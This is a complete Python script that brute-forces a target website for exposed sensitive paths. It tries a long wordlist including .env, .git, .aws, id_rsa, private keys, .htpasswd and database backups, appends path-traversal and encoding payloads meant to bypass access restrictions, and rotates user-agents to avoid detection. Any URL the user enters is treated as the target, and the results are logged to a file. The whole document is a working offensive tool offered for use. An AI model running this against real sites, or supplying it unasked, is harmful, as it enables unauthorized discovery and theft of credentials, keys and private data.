import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import time

# List of directories to test
directories = [
    'admin', 'administrator', 'backup', 'backups', 'config', 'configs', 'data', 'db', 'database', 
    'dev', 'include', 'includes', 'log', 'logs', 'private', 'secure', 'server', 'test', 'tests', 
    'tmp', 'uploads', 'wp-admin', 'wp-content', 'wp-includes', 'cgi-bin', 'scripts', 'assets', 
    'secrets', 'env', 'configurations', 'phpmyadmin', 'controlpanel', 'cpanel', 'adminpanel', 
    'admin_area', 'console', 'shell', 'access', 'root', 'key', 'keys', 'certificate', 'certificates', 
    'ssl', 'pki', 'privatekey', 'privatekeys', 'ssh', 'sftp', 'webmail', 'mail', 'emails', 'phpinfo', 
    'info', 'debug', 'debugging', 'error', 'errors', 'status', 'sessions', 'session', 'cache', 'caches', 
    'backup_files', 'backup_data', 'database_backups', 'saved_data', 'old_data', 'old_versions', 
    'previous_versions', 'old_backups', 'archive', 'archived', 'storage', 'stored_data', 'vault', 
    'hidden', 'invisible', 'stealth', 'protect', 'safeguard', 'firewall', 'defense', 'security', 
    'guard', 'monitor', 'observatory', 'protection', 'quarantine', 'sandbox', 'restricted', 
    'restricted_area', 'confidential', 'sensitive', 'hidden_files', 'hidden_data', 'shadow', 
    'shadows', 'classified', 'top_secret', '.env', '.git', '.htaccess', '.htpasswd', '.bash_history', 
    '.bash_profile', '.bashrc', '.cshrc', '.login', '.profile', '.ssh', '.gitignore', '.gitconfig', 
    '.svn', '.DS_Store', '.npmrc', '.htgroups', '.my.cnf', '.netrc', '.ftpaccess', '.aws', '.azure', 
    '.kube', '.dockerignore', '.dockercfg', '.travis.yml', '.circleci', '.buildignore', '.buildpath', 
    '.composer', '.cache', '.config', '.meteor', '.local', '.idea', '.vscode', '.editorconfig', 
    '.project', '.classpath', '.settings', '.metadata', '.projectrc', '.jsprc', '.vscodeignore', 
    '.cvsignore', '.log', '.private', '.secrets', '.sensitive', '.old_files', '.old_data', 
    '.hidden_files', '.hidden_data', '.backup', '.old_versions', '.previous_versions', '.archive', 
    '.archived', '.save', '.storage', '.stored_data', '.vault', '.debug', '.debugging', '.error', 
    '.errors', '.status', '.sessions', '.cache', '.old_backups', '.ssh/known_hosts', 
    '.ssh/authorized_keys', '.npmrc', '.ftpconfig', '.gitlab-ci.yml', '.drone.yml', '.cfignore', 
    '.bzrignore', '.hgrc', '.jshintrc', '.eslintrc', '.terraform', '.DS_Store', '.htaccess.bak', 
    '.htpasswd.bak', '.well-known', 'backup.sql', 'database.sql', 'phpinfo.php', 'config.php.bak', 
    'config.old', 'config.json', 'config.yaml', 'config.ini', 'web.config', 'docker-compose.yml', 
    'Dockerfile', 'composer.json', 'package.json', 'bower.json', 'Procfile', 'index.php.bak', 
    'index.html.bak', 'test.php', 'debug.php', 'error.log', 'access.log', 'debug.log', 'dev.log', 
    'backup.tar.gz', 'old.sql', 'db_backup.sql', 'old/website.bak', 'old/website.tar.gz', 
    'old/db.sql', 'old/data', 'old/logs', 'secrets.json', 'keys.json', 'private.pem', 'private.key', 
    'ssl.key', 'ssl.crt', 'cert.pem', 'server.key', 'server.crt', 'api.key', 'api_secret.key', 
    'ssh_host_rsa_key', 'id_rsa', 'id_rsa.pub', 'pgpass', 'passwd', 'secret_token.rb', 'database.yml', 
    'initializers', 'credentials.yml', 'vault_pass.txt', 'hidden', 'invisible', 'secure', 'configs', 
    'environment', 'env', 'settings', 'sensitive', 'keys', 'certs', 'credentials', 'tokens', 
    'private_data', 'user_data', 'user_profiles', 'backup_data', 'old_backups', 'archived', 
    'archive_data', 'vault', 'protected', 'hidden_files', 'invisible_files', 'backup_files', 
    'old_files', 'debug_files', 'log_files', 'error_files', 'test_files', 'temp', 'tmp_files', 
    'session_files', 'cache_files', 'hidden_directories', 'invisible_directories', 'backup_directories', 
    'old_directories', 'debug_directories', 'log_directories', 'error_directories', 'test_directories', 
    'temp_directories', 'tmp_directories', 'session_directories', 'cache_directories'
]

# Payloads to bypass restrictions
payloads = [
    '', '%00', '.', ';', '//', '/./', '%2F', '/%2e%2e/', '/%2e/',
    '%2e%2e%2f', '%2e/', '/%252e%252e/', '/%25c0%25ae%25c0%25ae/',
    '/%c0%ae%c0%ae/', '/%uff0e%uff0e/', '/%c0%ae%25c0%25ae/',
    '/%uff0e%uff0e/', '%u0061%u0064%u006d%u0069%u006e/', '%u0062%u0061%u0063%u006b%u0075%u0070/',
    '~', '/', '\\', '/*', '~', '/~', './', '\\', '/admin%2F', '/backup%2F'
]

# List of user-agents for randomization
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', 
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36 Edge/15.15063',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 Edge/16.17017'
]

# Function to get random user-agent
def get_random_user_agent():
    return random.choice(user_agents)

# Function to get description for status codes
def get_status_description(status_code):
    descriptions = {
        200: "OK",
        301: "Moved Permanently",
        302: "Found",
        401: "Unauthorized",
        403: "Forbidden",
        404: "Not Found",
        500: "Internal Server Error",
    }
    return descriptions.get(status_code, "Unknown")

# Function to attempt to access a directory with a payload
def test_directory(session, base_url, directory, payload):
    url = f"{base_url}/{directory}{payload}"
    headers = {'User-Agent': get_random_user_agent()}
    try:
        response = session.get(url, headers=headers, allow_redirects=False, timeout=5)
        status_code = response.status_code
        status_description = get_status_description(status_code)
        if status_code not in [403, 404]:
            result = f"Accessible: {url} - Status Code: {status_code} ({status_description})"
        else:
            result = f"Forbidden/Not Found: {url} - Status Code: {status_code} ({status_description})"
    except requests.RequestException as e:
        result = f"Error: {url} - {str(e)}"
    except Exception as e:
        result = f"Error: {url} - {str(e)}"
    return result

# Main function to take URL input and run tests
def main():
    base_url = input("Enter the base URL of the target site (e.g., http://example.com): ")

    session = requests.Session()
    session.headers.update({'User-Agent': get_random_user_agent()})

    results = []
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(test_directory, session, base_url, directory, payload) for directory in directories for payload in payloads]
        for future in as_completed(futures):
            result = future.result()
            if result:
                results.append(result)

    end_time = time.time()
    duration = end_time - start_time

    print(f"\nScan completed in {duration:.2f} seconds.")
    
    with open("scan_results.txt", "w") as f:
        for result in results:
            f.write(result + "\n")

if __name__ == "__main__":
    main()
